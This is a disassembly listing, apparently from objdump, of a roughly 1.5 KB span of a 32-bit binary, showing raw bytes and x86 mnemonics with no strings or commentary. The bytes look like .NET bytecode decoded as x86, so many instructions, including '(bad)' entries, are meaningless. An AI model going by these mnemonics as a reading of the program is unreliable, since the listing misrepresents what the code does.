  4041b2:	00 00                	add    %al,(%eax)
  4041b4:	7e 2c                	jle    0x4041e2
  4041b6:	00 00                	add    %al,(%eax)
  4041b8:	04 3a                	add    $0x3a,%al
  4041ba:	37                   	aaa
  4041bb:	00 00                	add    %al,(%eax)
  4041bd:	00 28                	add    %ch,(%eax)
  4041bf:	3b 00                	cmp    (%eax),%eax
  4041c1:	00 06                	add    %al,(%esi)
  4041c3:	72 64                	jb     0x404229
  4041c5:	04 00                	add    $0x0,%al
  4041c7:	70 28                	jo     0x4041f1
  4041c9:	7d 00                	jge    0x4041cb
  4041cb:	00 0a                	add    %cl,(%edx)
  4041cd:	72 76                	jb     0x404245
  4041cf:	04 00                	add    $0x0,%al
  4041d1:	70 28                	jo     0x4041fb
  4041d3:	89 00                	mov    %eax,(%eax)
  4041d5:	00 0a                	add    %cl,(%edx)
  4041d7:	28 34 00             	sub    %dh,(%eax,%eax,1)
  4041da:	00 06                	add    %al,(%esi)
  4041dc:	d0 16                	rclb   $1,(%esi)
  4041de:	00 00                	add    %al,(%eax)
  4041e0:	02 28                	add    (%eax),%ch
  4041e2:	34 00                	xor    $0x0,%al
  4041e4:	00 0a                	add    %cl,(%edx)
  4041e6:	28 8a 00 00 0a 74    	sub    %cl,0x740a0000(%edx)
  4041ec:	16                   	push   %ss
  4041ed:	00 00                	add    %al,(%eax)
  4041ef:	02 80 2c 00 00 04    	add    0x400002c(%eax),%al
  4041f5:	7e 2c                	jle    0x404223
  4041f7:	00 00                	add    %al,(%eax)
  4041f9:	04 02                	add    $0x2,%al
  4041fb:	03 04 05 6f 65 00 00 	add    0x656f(,%eax,1),%eax
  404202:	06                   	push   %es
  404203:	2a 13                	sub    (%ebx),%dl
  404205:	30 07                	xor    %al,(%edi)
  404207:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  40420b:	00 00                	add    %al,(%eax)
  40420d:	00 00                	add    %al,(%eax)
  40420f:	00 7e 2d             	add    %bh,0x2d(%esi)
  404212:	00 00                	add    %al,(%eax)
  404214:	04 3a                	add    $0x3a,%al
  404216:	41                   	inc    %ecx
  404217:	00 00                	add    %al,(%eax)
  404219:	00 28                	add    %ch,(%eax)
  40421b:	3b 00                	cmp    (%eax),%eax
  40421d:	00 06                	add    %al,(%esi)
  40421f:	72 82                	jb     0x4041a3
  404221:	04 00                	add    $0x0,%al
  404223:	70 28                	jo     0x40424d
  404225:	7d 00                	jge    0x404227
  404227:	00 0a                	add    %cl,(%edx)
  404229:	72 90                	jb     0x4041bb
  40422b:	04 00                	add    $0x0,%al
  40422d:	70 28                	jo     0x404257
  40422f:	7d 00                	jge    0x404231
  404231:	00 0a                	add    %cl,(%edx)
  404233:	72 a2                	jb     0x4041d7
  404235:	04 00                	add    $0x0,%al
  404237:	70 28                	jo     0x404261
  404239:	8b 00                	mov    (%eax),%eax
  40423b:	00 0a                	add    %cl,(%edx)
  40423d:	28 34 00             	sub    %dh,(%eax,%eax,1)
  404240:	00 06                	add    %al,(%esi)
  404242:	d0 17                	rclb   $1,(%edi)
  404244:	00 00                	add    %al,(%eax)
  404246:	02 28                	add    (%eax),%ch
  404248:	34 00                	xor    $0x0,%al
  40424a:	00 0a                	add    %cl,(%edx)
  40424c:	28 8a 00 00 0a 74    	sub    %cl,0x740a0000(%edx)
  404252:	17                   	pop    %ss
  404253:	00 00                	add    %al,(%eax)
  404255:	02 80 2d 00 00 04    	add    0x400002d(%eax),%al
  40425b:	7e 2d                	jle    0x40428a
  40425d:	00 00                	add    %al,(%eax)
  40425f:	04 02                	add    $0x2,%al
  404261:	03 04 05 0e 04 6f 69 	add    0x696f040e(,%eax,1),%eax
  404268:	00 00                	add    %al,(%eax)
  40426a:	06                   	push   %es
  40426b:	2a 13                	sub    (%ebx),%dl
  40426d:	30 06                	xor    %al,(%esi)
  40426f:	00 50 00             	add    %dl,0x0(%eax)
  404272:	00 00                	add    %al,(%eax)
  404274:	00 00                	add    %al,(%eax)
  404276:	00 00                	add    %al,(%eax)
  404278:	7e 2e                	jle    0x4042a8
  40427a:	00 00                	add    %al,(%eax)
  40427c:	04 3a                	add    $0x3a,%al
  40427e:	37                   	aaa
  40427f:	00 00                	add    %al,(%eax)
  404281:	00 28                	add    %ch,(%eax)
  404283:	3b 00                	cmp    (%eax),%eax
  404285:	00 06                	add    %al,(%esi)
  404287:	72 64                	jb     0x4042ed
  404289:	04 00                	add    $0x0,%al
  40428b:	70 28                	jo     0x4042b5
  40428d:	7d 00                	jge    0x40428f
  40428f:	00 0a                	add    %cl,(%edx)
  404291:	72 b0                	jb     0x404243
  404293:	04 00                	add    $0x0,%al
  404295:	70 28                	jo     0x4042bf
  404297:	89 00                	mov    %eax,(%eax)
  404299:	00 0a                	add    %cl,(%edx)
  40429b:	28 34 00             	sub    %dh,(%eax,%eax,1)
  40429e:	00 06                	add    %al,(%esi)
  4042a0:	d0 18                	rcrb   $1,(%eax)
  4042a2:	00 00                	add    %al,(%eax)
  4042a4:	02 28                	add    (%eax),%ch
  4042a6:	34 00                	xor    $0x0,%al
  4042a8:	00 0a                	add    %cl,(%edx)
  4042aa:	28 8a 00 00 0a 74    	sub    %cl,0x740a0000(%edx)
  4042b0:	18 00                	sbb    %al,(%eax)
  4042b2:	00 02                	add    %al,(%edx)
  4042b4:	80 2e 00             	subb   $0x0,(%esi)
  4042b7:	00 04 7e             	add    %al,(%esi,%edi,2)
  4042ba:	2e 00 00             	add    %al,%cs:(%eax)
  4042bd:	04 02                	add    $0x2,%al
  4042bf:	03 04 05 6f 6d 00 00 	add    0x6d6f(,%eax,1),%eax
  4042c6:	06                   	push   %es
  4042c7:	2a 13                	sub    (%ebx),%dl
  4042c9:	30 05 00 4f 00 00    	xor    %al,0x4f00
  4042cf:	00 00                	add    %al,(%eax)
  4042d1:	00 00                	add    %al,(%eax)
  4042d3:	00 7e 2f             	add    %bh,0x2f(%esi)
  4042d6:	00 00                	add    %al,(%eax)
  4042d8:	04 3a                	add    $0x3a,%al
  4042da:	37                   	aaa
  4042db:	00 00                	add    %al,(%eax)
  4042dd:	00 28                	add    %ch,(%eax)
  4042df:	3b 00                	cmp    (%eax),%eax
  4042e1:	00 06                	add    %al,(%esi)
  4042e3:	72 c0                	jb     0x4042a5
  4042e5:	04 00                	add    $0x0,%al
  4042e7:	70 28                	jo     0x404311
  4042e9:	7d 00                	jge    0x4042eb
  4042eb:	00 0a                	add    %cl,(%edx)
  4042ed:	72 cc                	jb     0x4042bb
  4042ef:	04 00                	add    $0x0,%al
  4042f1:	70 28                	jo     0x40431b
  4042f3:	89 00                	mov    %eax,(%eax)
  4042f5:	00 0a                	add    %cl,(%edx)
  4042f7:	28 34 00             	sub    %dh,(%eax,%eax,1)
  4042fa:	00 06                	add    %al,(%esi)
  4042fc:	d0 19                	rcrb   $1,(%ecx)
  4042fe:	00 00                	add    %al,(%eax)
  404300:	02 28                	add    (%eax),%ch
  404302:	34 00                	xor    $0x0,%al
  404304:	00 0a                	add    %cl,(%edx)
  404306:	28 8a 00 00 0a 74    	sub    %cl,0x740a0000(%edx)
  40430c:	19 00                	sbb    %eax,(%eax)
  40430e:	00 02                	add    %al,(%edx)
  404310:	80 2f 00             	subb   $0x0,(%edi)
  404313:	00 04 7e             	add    %al,(%esi,%edi,2)
  404316:	2f                   	das
  404317:	00 00                	add    %al,(%eax)
  404319:	04 02                	add    $0x2,%al
  40431b:	03 04 6f             	add    (%edi,%ebp,2),%eax
  40431e:	71 00                	jno    0x404320
  404320:	00 06                	add    %al,(%esi)
  404322:	2a 00                	sub    (%eax),%al
  404324:	13 30                	adc    (%eax),%esi
  404326:	04 00                	add    $0x0,%al
  404328:	4d                   	dec    %ebp
  404329:	00 00                	add    %al,(%eax)
  40432b:	00 00                	add    %al,(%eax)
  40432d:	00 00                	add    %al,(%eax)
  40432f:	00 7e 30             	add    %bh,0x30(%esi)
  404332:	00 00                	add    %al,(%eax)
  404334:	04 3a                	add    $0x3a,%al
  404336:	37                   	aaa
  404337:	00 00                	add    %al,(%eax)
  404339:	00 28                	add    %ch,(%eax)
  40433b:	3b 00                	cmp    (%eax),%eax
  40433d:	00 06                	add    %al,(%esi)
  40433f:	72 dc                	jb     0x40431d
  404341:	04 00                	add    $0x0,%al
  404343:	70 28                	jo     0x40436d
  404345:	7d 00                	jge    0x404347
  404347:	00 0a                	add    %cl,(%edx)
  404349:	72 ea                	jb     0x404335
  40434b:	04 00                	add    $0x0,%al
  40434d:	70 28                	jo     0x404377
  40434f:	89 00                	mov    %eax,(%eax)
  404351:	00 0a                	add    %cl,(%edx)
  404353:	28 34 00             	sub    %dh,(%eax,%eax,1)
  404356:	00 06                	add    %al,(%esi)
  404358:	d0 1a                	rcrb   $1,(%edx)
  40435a:	00 00                	add    %al,(%eax)
  40435c:	02 28                	add    (%eax),%ch
  40435e:	34 00                	xor    $0x0,%al
  404360:	00 0a                	add    %cl,(%edx)
  404362:	28 8a 00 00 0a 74    	sub    %cl,0x740a0000(%edx)
  404368:	1a 00                	sbb    (%eax),%al
  40436a:	00 02                	add    %al,(%edx)
  40436c:	80 30 00             	xorb   $0x0,(%eax)
  40436f:	00 04 7e             	add    %al,(%esi,%edi,2)
  404372:	30 00                	xor    %al,(%eax)
  404374:	00 04 02             	add    %al,(%edx,%eax,1)
  404377:	6f                   	outsl  %ds:(%esi),(%dx)
  404378:	75 00                	jne    0x40437a
  40437a:	00 06                	add    %al,(%esi)
  40437c:	2a 00                	sub    (%eax),%al
  40437e:	00 00                	add    %al,(%eax)
  404380:	e2 7e                	loop   0x404400
  404382:	31 00                	xor    %eax,(%eax)
  404384:	00 04 7e             	add    %al,(%esi,%edi,2)
  404387:	37                   	aaa
  404388:	00 00                	add    %al,(%eax)
  40438a:	0a 28                	or     (%eax),%ch
  40438c:	8c 00                	mov    %es,(%eax)
  40438e:	00 0a                	add    %cl,(%edx)
  404390:	39 1e                	cmp    %ebx,(%esi)
  404392:	00 00                	add    %al,(%eax)
  404394:	00 72 f8             	add    %dh,-0x8(%edx)
  404397:	04 00                	add    $0x0,%al
  404399:	70 28                	jo     0x4043c3
  40439b:	7d 00                	jge    0x40439d
  40439d:	00 0a                	add    %cl,(%edx)
  40439f:	72 08                	jb     0x4043a9
  4043a1:	05 00 70 28 89       	add    $0x89287000,%eax
  4043a6:	00 00                	add    %al,(%eax)
  4043a8:	0a 28                	or     (%eax),%ch
  4043aa:	33 00                	xor    (%eax),%eax
  4043ac:	00 06                	add    %al,(%esi)
  4043ae:	80 31 00             	xorb   $0x0,(%ecx)
  4043b1:	00 04 7e             	add    %al,(%esi,%edi,2)
  4043b4:	31 00                	xor    %eax,(%eax)
  4043b6:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4043b9:	00 00                	add    %al,(%eax)
  4043bb:	00 1b                	add    %bl,(%ebx)
  4043bd:	30 05 00 50 00 00    	xor    %al,0x5000
  4043c3:	00 0f                	add    %cl,(%edi)
  4043c5:	00 00                	add    %al,(%eax)
  4043c7:	11 02                	adc    %eax,(%edx)
  4043c9:	19 17                	sbb    %edx,(%edi)
  4043cb:	17                   	pop    %ss
  4043cc:	73 8d                	jae    0x40435b
  4043ce:	00 00                	add    %al,(%eax)
  4043d0:	0a 0b                	or     (%ebx),%cl
  4043d2:	16                   	push   %ss
  4043d3:	0c 07                	or     $0x7,%al
  4043d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4043d6:	4d                   	dec    %ebp
  4043d7:	00 00                	add    %al,(%eax)
  4043d9:	0a 69 0d             	or     0xd(%ecx),%ch
  4043dc:	09 8d 1d 00 00 01    	or     %ecx,0x100001d(%ebp)
  4043e2:	0a 38                	or     (%eax),%bh
  4043e4:	15 00 00 00 07       	adc    $0x7000000,%eax
  4043e9:	06                   	push   %es
  4043ea:	08 09                	or     %cl,(%ecx)
  4043ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4043ed:	44                   	inc    %esp
  4043ee:	00 00                	add    %al,(%eax)
  4043f0:	0a 13                	or     (%ebx),%dl
  4043f2:	04 08                	add    $0x8,%al
  4043f4:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  4043f7:	0c 09                	or     $0x9,%al
  4043f9:	11 04 59             	adc    %eax,(%ecx,%ebx,2)
  4043fc:	0d 09 16 3d e4       	or     $0xe43d1609,%eax
  404401:	ff                   	(bad)
  404402:	ff                   	(bad)
  404403:	ff                   	lcall  (bad)
  404404:	dd 0d 00 00 00 07    	fisttpll 0x7000000
  40440a:	39 06                	cmp    %eax,(%esi)
  40440c:	00 00                	add    %al,(%eax)
  40440e:	00 07                	add    %al,(%edi)
  404410:	6f                   	outsl  %ds:(%esi),(%dx)
  404411:	8e 00                	mov    (%eax),%es
  404413:	00 0a                	add    %cl,(%edx)
  404415:	dc 06                	faddl  (%esi)
  404417:	2a 01                	sub    (%ecx),%al
  404419:	10 00                	adc    %al,(%eax)
  40441b:	00 02                	add    %al,(%edx)
  40441d:	00 0a                	add    %cl,(%edx)
  40441f:	00 37                	add    %dh,(%edi)
  404421:	41                   	inc    %ecx
  404422:	00 0d 00 00 00 00    	add    %cl,0x0
  404428:	1a 73 8f             	sbb    -0x71(%ebx),%dh
  40442b:	00 00                	add    %al,(%eax)
  40442d:	0a 2a                	or     (%edx),%ch
  40442f:	00 32                	add    %dh,(%edx)
  404431:	02 74 4e 00          	add    0x0(%esi,%ecx,2),%dh
  404435:	00 01                	add    %al,(%ecx)
  404437:	6f                   	outsl  %ds:(%esi),(%dx)
  404438:	90                   	nop
  404439:	00 00                	add    %al,(%eax)
  40443b:	0a 2a                	or     (%edx),%ch
  40443d:	00 00                	add    %al,(%eax)
  40443f:	00 13                	add    %dl,(%ebx)
  404441:	30 06                	xor    %al,(%esi)
  404443:	00 65 00             	add    %ah,0x0(%ebp)
  404446:	00 00                	add    %al,(%eax)
  404448:	10 00                	adc    %al,(%eax)
  40444a:	00 11                	add    %dl,(%ecx)
  40444c:	28 3d 00 00 06 0a    	sub    %bh,0xa060000
  404452:	28 22                	sub    %ah,(%edx)
  404454:	00 00                	add    %al,(%eax)
  404456:	06                   	push   %es
  404457:	0b 07                	or     (%edi),%eax
  404459:	1f                   	pop    %ds
  40445a:	20 8d 1d 00 00 01    	and    %cl,0x100001d(%ebp)
  404460:	25 d0 3d 00 00       	and    $0x3dd0,%eax
  404465:	04 28                	add    $0x28,%al
  404467:	17                   	pop    %ss
  404468:	00 00                	add    %al,(%eax)
  40446a:	0a 6f 91             	or     -0x6f(%edi),%ch
  40446d:	00 00                	add    %al,(%eax)
  40446f:	0a 07                	or     (%edi),%al
  404471:	1f                   	pop    %ds
  404472:	10 8d 1d 00 00 01    	adc    %cl,0x100001d(%ebp)
  404478:	25 d0 40 00 00       	and    $0x40d0,%eax
  40447d:	04 28                	add    $0x28,%al
  40447f:	17                   	pop    %ss
  404480:	00 00                	add    %al,(%eax)
  404482:	0a 6f 92             	or     -0x6e(%edi),%ch
  404485:	00 00                	add    %al,(%eax)
  404487:	0a 06                	or     (%esi),%al
  404489:	07                   	pop    %es
  40448a:	6f                   	outsl  %ds:(%esi),(%dx)
  40448b:	93                   	xchg   %eax,%ebx
  40448c:	00 00                	add    %al,(%eax)
  40448e:	0a 17                	or     (%edi),%dl
  404490:	73 77                	jae    0x404509
  404492:	00 00                	add    %al,(%eax)
  404494:	0a 25 02 16 02 8e    	or     0x8e021602,%ah
  40449a:	69 6f 78 00 00 0a 6f 	imul   $0x6f0a0000,0x78(%edi),%ebp
  4044a1:	7a 00                	jp     0x4044a3
  4044a3:	00 0a                	add    %cl,(%edx)
  4044a5:	06                   	push   %es
  4044a6:	28 3e                	sub    %bh,(%esi)
  4044a8:	00 00                	add    %al,(%eax)
  4044aa:	06                   	push   %es
  4044ab:	28 78 00             	sub    %bh,0x0(%eax)
  4044ae:	00 06                	add    %al,(%esi)
  4044b0:	2a 00                	sub    (%eax),%al
  4044b2:	00 00                	add    %al,(%eax)
  4044b4:	72 72                	jb     0x404528
  4044b6:	16                   	push   %ss
  4044b7:	05 00 70 6f 70       	add    $0x706f7000,%eax
  4044bc:	00 00                	add    %al,(%eax)
  4044be:	0a 16                	or     (%esi),%dl
  4044c0:	26 26 18 8d 1d 00 00 	es sbb %cl,%es:0x100001d(%ebp)
  4044c7:	01 
  4044c8:	25 16 17 9c 25       	and    $0x259c1716,%eax
  4044cd:	17                   	pop    %ss
  4044ce:	18 9c 2a 00 00 00 72 	sbb    %bl,0x72000000(%edx,%ebp,1)
  4044d5:	72 4a                	jb     0x404521
  4044d7:	05 00 70 6f 70       	add    $0x706f7000,%eax
  4044dc:	00 00                	add    %al,(%eax)
  4044de:	0a 16                	or     (%esi),%dl
  4044e0:	26 26 18 8d 1d 00 00 	es sbb %cl,%es:0x100001d(%ebp)
  4044e7:	01 
  4044e8:	25 16 17 9c 25       	and    $0x259c1716,%eax
  4044ed:	17                   	pop    %ss
  4044ee:	18 9c 2a 00 00 00 72 	sbb    %bl,0x72000000(%edx,%ebp,1)
  4044f5:	72 7e                	jb     0x404575
  4044f7:	05 00 70 6f 70       	add    $0x706f7000,%eax
  4044fc:	00 00                	add    %al,(%eax)
  4044fe:	0a 16                	or     (%esi),%dl
  404500:	26 26 18 8d 1d 00 00 	es sbb %cl,%es:0x100001d(%ebp)
  404507:	01 
  404508:	25 16 17 9c 25       	and    $0x259c1716,%eax
  40450d:	17                   	pop    %ss
  40450e:	18 9c 2a 00 00 00 72 	sbb    %bl,0x72000000(%edx,%ebp,1)
  404515:	72 b2                	jb     0x4044c9
  404517:	05 00 70 6f 70       	add    $0x706f7000,%eax
  40451c:	00 00                	add    %al,(%eax)
  40451e:	0a 16                	or     (%esi),%dl
  404520:	26 26 18 8d 1d 00 00 	es sbb %cl,%es:0x100001d(%ebp)
  404527:	01 
  404528:	25 16 17 9c 25       	and    $0x259c1716,%eax
  40452d:	17                   	pop    %ss
  40452e:	18 9c 2a 00 00 00 72 	sbb    %bl,0x72000000(%edx,%ebp,1)
  404535:	72 e6                	jb     0x40451d
  404537:	05 00 70 6f 70       	add    $0x706f7000,%eax
  40453c:	00 00                	add    %al,(%eax)
  40453e:	0a 16                	or     (%esi),%dl
  404540:	26 26 18 8d 1d 00 00 	es sbb %cl,%es:0x100001d(%ebp)
  404547:	01 
  404548:	25 16 17 9c 25       	and    $0x259c1716,%eax
  40454d:	17                   	pop    %ss
  40454e:	18 9c 2a 00 00 00 72 	sbb    %bl,0x72000000(%edx,%ebp,1)
  404555:	72 1a                	jb     0x404571
  404557:	06                   	push   %es
  404558:	00 70 6f             	add    %dh,0x6f(%eax)
  40455b:	70 00                	jo     0x40455d
  40455d:	00 0a                	add    %cl,(%edx)
  40455f:	16                   	push   %ss
  404560:	26 26 18 8d 1d 00 00 	es sbb %cl,%es:0x100001d(%ebp)
  404567:	01 
  404568:	25 16 17 9c 25       	and    $0x259c1716,%eax
  40456d:	17                   	pop    %ss
  40456e:	18 9c 2a 00 00 00 72 	sbb    %bl,0x72000000(%edx,%ebp,1)
  404575:	72 4e                	jb     0x4045c5
  404577:	06                   	push   %es
  404578:	00 70 6f             	add    %dh,0x6f(%eax)
  40457b:	70 00                	jo     0x40457d
  40457d:	00 0a                	add    %cl,(%edx)
  40457f:	16                   	push   %ss
  404580:	26 26 18 8d 1d 00 00 	es sbb %cl,%es:0x100001d(%ebp)
  404587:	01 
  404588:	25 16 17 9c 25       	and    $0x259c1716,%eax
  40458d:	17                   	pop    %ss
  40458e:	18 9c 2a 00 00 00 72 	sbb    %bl,0x72000000(%edx,%ebp,1)
  404595:	72 82                	jb     0x404519
  404597:	06                   	push   %es
  404598:	00 70 6f             	add    %dh,0x6f(%eax)
  40459b:	70 00                	jo     0x40459d
  40459d:	00 0a                	add    %cl,(%edx)
  40459f:	16                   	push   %ss
  4045a0:	26 26 18 8d 1d 00 00 	es sbb %cl,%es:0x100001d(%ebp)
  4045a7:	01 
  4045a8:	25 16 17 9c 25       	and    $0x259c1716,%eax
  4045ad:	17                   	pop    %ss
  4045ae:	18 9c 2a 00 00 00 13 	sbb    %bl,0x13000000(%edx,%ebp,1)
  4045b5:	30 02                	xor    %al,(%edx)
  4045b7:	00 02                	add    %al,(%edx)
  4045b9:	00 00                	add    %al,(%eax)
  4045bb:	00 11                	add    %dl,(%ecx)
  4045bd:	00 00                	add    %al,(%eax)
  4045bf:	11 14 2a             	adc    %edx,(%edx,%ebp,1)
  4045c2:	00 00                	add    %al,(%eax)
  4045c4:	13 30                	adc    (%eax),%esi
  4045c6:	02 00                	add    (%eax),%al
  4045c8:	02 00                	add    (%eax),%al
  4045ca:	00 00                	add    %al,(%eax)
  4045cc:	11 00                	adc    %eax,(%eax)
  4045ce:	00 11                	add    %dl,(%ecx)
  4045d0:	14 2a                	adc    $0x2a,%al
  4045d2:	00 00                	add    %al,(%eax)
  4045d4:	1e                   	push   %ds
  4045d5:	02 28                	add    (%eax),%ch
  4045d7:	94                   	xchg   %eax,%esp
  4045d8:	00 00                	add    %al,(%eax)
  4045da:	0a 2a                	or     (%edx),%ch
  4045dc:	46                   	inc    %esi
  4045dd:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  4045e0:	00 06                	add    %al,(%esi)
  4045e2:	28 78 00             	sub    %bh,0x0(%eax)
  4045e5:	00 06                	add    %al,(%esi)
  4045e7:	02 28                	add    (%eax),%ch
  4045e9:	15 00 00 0a 2a       	adc    $0x2a0a0000,%eax
  4045ee:	00 00                	add    %al,(%eax)
  4045f0:	13 30                	adc    (%eax),%esi
  4045f2:	07                   	pop    %es
  4045f3:	00 71 00             	add    %dh,0x0(%ecx)
  4045f6:	00 00                	add    %al,(%eax)
  4045f8:	12 00                	adc    (%eax),%al
  4045fa:	00 11                	add    %dl,(%ecx)
  4045fc:	28 7e 00             	sub    %bh,0x0(%esi)
  4045ff:	00 0a                	add    %cl,(%edx)
  404601:	02 6f 95             	add    -0x6b(%edi),%ch
  404604:	00 00                	add    %al,(%eax)
  404606:	0a 0a                	or     (%edx),%cl
  404608:	1f                   	pop    %ds
  404609:	20 8d 1d 00 00 01    	and    %cl,0x100001d(%ebp)
  40460f:	25 d0 41 00 00       	and    $0x41d0,%eax
  404614:	04 28                	add    $0x28,%al
  404616:	17                   	pop    %ss
  404617:	00 00                	add    %al,(%eax)
  404619:	0a 0b                	or     (%ebx),%cl
  40461b:	28 7e 00             	sub    %bh,0x0(%esi)
  40461e:	00 0a                	add    %cl,(%edx)
  404620:	03 6f 95             	add    -0x6b(%edi),%ebp
  404623:	00 00                	add    %al,(%eax)
  404625:	0a 28                	or     (%eax),%ch
  404627:	24 00                	and    $0x0,%al
  404629:	00 06                	add    %al,(%esi)
  40462b:	0c 73                	or     $0x73,%al
  40462d:	8f 00                	pop    (%eax)
  40462f:	00 0a                	add    %cl,(%edx)
  404631:	28 22                	sub    %ah,(%edx)
  404633:	00 00                	add    %al,(%eax)
  404635:	06                   	push   %es
  404636:	0d 09 07 6f 91       	or     $0x916f0709,%eax
  40463b:	00 00                	add    %al,(%eax)
  40463d:	0a 09                	or     (%ecx),%cl
  40463f:	08 6f 92             	or     %ch,-0x6e(%edi)
  404642:	00 00                	add    %al,(%eax)
  404644:	0a 25 09 6f 96 00    	or     0x966f09,%ah
  40464a:	00 0a                	add    %cl,(%edx)
  40464c:	17                   	pop    %ss
  40464d:	73 77                	jae    0x4046c6
  40464f:	00 00                	add    %al,(%eax)
  404651:	0a 25 06 16 06 8e    	or     0x8e061606,%ah
  404657:	69 6f 78 00 00 0a 6f 	imul   $0x6f0a0000,0x78(%edi),%ebp
  40465e:	7a 00                	jp     0x404660
  404660:	00 0a                	add    %cl,(%edx)
  404662:	6f                   	outsl  %ds:(%esi),(%dx)
  404663:	90                   	nop
  404664:	00 00                	add    %al,(%eax)
  404666:	0a 28                	or     (%eax),%ch
  404668:	97                   	xchg   %eax,%edi
  404669:	00 00                	add    %al,(%eax)
  40466b:	0a 2a                	or     (%edx),%ch
  40466d:	00 00                	add    %al,(%eax)
  40466f:	00 1e                	add    %bl,(%esi)
  404671:	02 28                	add    (%eax),%ch
  404673:	15 00 00 0a 2a       	adc    $0x2a0a0000,%eax
  404678:	4e                   	dec    %esi
  404679:	02 28                	add    (%eax),%ch
  40467b:	15 00 00 0a 02       	adc    $0x20a0000,%eax
  404680:	03 73 4c             	add    0x4c(%ebx),%esi
  404683:	00 00                	add    %al,(%eax)
  404685:	0a 7d 34             	or     0x34(%ebp),%bh
  404688:	00 00                	add    %al,(%eax)
  40468a:	04 2a                	add    $0x2a,%al
  40468c:	32 02                	xor    (%edx),%al
  40468e:	7b 34                	jnp    0x4046c4
  404690:	00 00                	add    %al,(%eax)
  404692:	04 6f                	add    $0x6f,%al
  404694:	46                   	inc    %esi
  404695:	00 00                	add    %al,(%eax)
  404697:	0a 2a                	or     (%edx),%ch
  404699:	00 00                	add    %al,(%eax)
  40469b:	00 36                	add    %dh,(%esi)
  40469d:	02 7b 34             	add    0x34(%ebx),%bh
  4046a0:	00 00                	add    %al,(%eax)
  4046a2:	04 03                	add    $0x3,%al
  4046a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4046a5:	4e                   	dec    %esi
  4046a6:	00 00                	add    %al,(%eax)
  4046a8:	0a 2a                	or     (%edx),%ch
  4046aa:	00 00                	add    %al,(%eax)
  4046ac:	3e 02 7b 34          	add    %ds:0x34(%ebx),%bh
  4046b0:	00 00                	add    %al,(%eax)
  4046b2:	04 03                	add    $0x3,%al
  4046b4:	04 05                	add    $0x5,%al
  4046b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4046b7:	98                   	cwtl
  4046b8:	00 00                	add    %al,(%eax)
  4046ba:	0a 2a                	or     (%edx),%ch
  4046bc:	32 02                	xor    (%edx),%al
  4046be:	7b 34                	jnp    0x4046f4
  4046c0:	00 00                	add    %al,(%eax)
  4046c2:	04 6f                	add    $0x6f,%al
  4046c4:	99                   	cltd
  4046c5:	00 00                	add    %al,(%eax)
  4046c7:	0a 2a                	or     (%edx),%ch
  4046c9:	00 00                	add    %al,(%eax)
  4046cb:	00 32                	add    %dh,(%edx)
  4046cd:	02 7b 34             	add    0x34(%ebx),%bh
  4046d0:	00 00                	add    %al,(%eax)
  4046d2:	04 6f                	add    $0x6f,%al
  4046d4:	4f                   	dec    %edi
  4046d5:	00 00                	add    %al,(%eax)
  4046d7:	0a 2a                	or     (%edx),%ch
  4046d9:	00 00                	add    %al,(%eax)
  4046db:	00 13                	add    %dl,(%ebx)
  4046dd:	30 05 00 48 00 00    	xor    %al,0x4800
  4046e3:	00 01                	add    %al,(%ecx)
  4046e5:	00 00                	add    %al,(%eax)
  4046e7:	11 7e 36             	adc    %edi,0x36(%esi)
  4046ea:	00 00                	add    %al,(%eax)
  4046ec:	04 3a                	add    $0x3a,%al
  4046ee:	3d 00 00 00 17       	cmp    $0x17000000,%eax
  4046f3:	80 36 00             	xorb   $0x0,(%esi)
  4046f6:	00 04 28             	add    %al,(%eax,%ebp,1)
  4046f9:	0f 00 00             	sldt   (%eax)
  4046fc:	0a 20                	or     (%eax),%ah
  4046fe:	e9 07 00 00 1f       	jmp    0x1f40470a
  404703:	03 1f                	add    (%edi),%ebx
  404705:	04 73                	add    $0x73,%al
  404707:	10 00                	adc    %al,(%eax)
  404709:	00 0a                	add    %cl,(%edx)
  40470b:	28 11                	sub    %dl,(%ecx)
  40470d:	00 00                	add    %al,(%eax)
  40470f:	0a 0a                	or     (%edx),%cl
  404711:	12 00                	adc    (%eax),%al
  404713:	28 12                	sub    %dl,(%edx)
  404715:	00 00                	add    %al,(%eax)
  404717:	0a 28                	or     (%eax),%ch
  404719:	13 00                	adc    (%eax),%eax
  40471b:	00 0a                	add    %cl,(%edx)
  40471d:	1f                   	pop    %ds
  40471e:	0e                   	push   %cs
  40471f:	3f                   	aas
  404720:	0b 00                	or     (%eax),%eax
  404722:	00 00                	add    %al,(%eax)
  404724:	72 01                	jb     0x404727
  404726:	00 00                	add    %al,(%eax)
  404728:	70 73                	jo     0x40479d
  40472a:	14 00                	adc    $0x0,%al
  40472c:	00 0a                	add    %cl,(%edx)
  40472e:	7a 2a                	jp     0x40475a
  404730:	1e                   	push   %ds
  404731:	02 28                	add    (%eax),%ch
  404733:	15 00 00 0a 2a       	adc    $0x2a0a0000,%eax
  404738:	1b 30                	sbb    (%eax),%esi
  40473a:	06                   	push   %es
  40473b:	00 b1 3a 00 00 13    	add    %dh,0x1300003a(%ecx)
  404741:	00 00                	add    %al,(%eax)
  404743:	11 20                	adc    %esp,(%eax)
  404745:	ad                   	lods   %ds:(%esi),%eax
  404746:	00 00                	add    %al,(%eax)
  404748:	00 fe                	add    %bh,%dh
  40474a:	0e                   	push   %cs
  40474b:	2b 00                	sub    (%eax),%eax
  40474d:	38 00                	cmp    %al,(%eax)
  40474f:	00 00                	add    %al,(%eax)
  404751:	00 fe                	add    %bh,%dh
  404753:	0c 2b                	or     $0x2b,%al
  404755:	00 45 97             	add    %al,-0x69(%ebp)
  404758:	01 00                	add    %eax,(%eax)
  40475a:	00 6f 27             	add    %ch,0x27(%edi)
  40475d:	00 00                	add    %al,(%eax)
  40475f:	5c                   	pop    %esp
  404760:	2d 00 00 ed 20       	sub    $0x20ed0000,%eax
  404765:	00 00                	add    %al,(%eax)
  404767:	bd 2b 00 00 22       	mov    $0x2200002b,%ebp
  40476c:	04 00                	add    $0x0,%al
  40476e:	00 e3                	add    %ah,%bl
  404770:	04 00                	add    $0x0,%al
  404772:	00 af 28 00 00 55    	add    %ch,0x55000028(%edi)
  404778:	2f                   	das
  404779:	00 00                	add    %al,(%eax)
  40477b:	9a 0f 00 00 5b 08 00 	lcall  $0x8,$0x5b00000f
  404782:	00 4d 2a             	add    %cl,0x2a(%ebp)
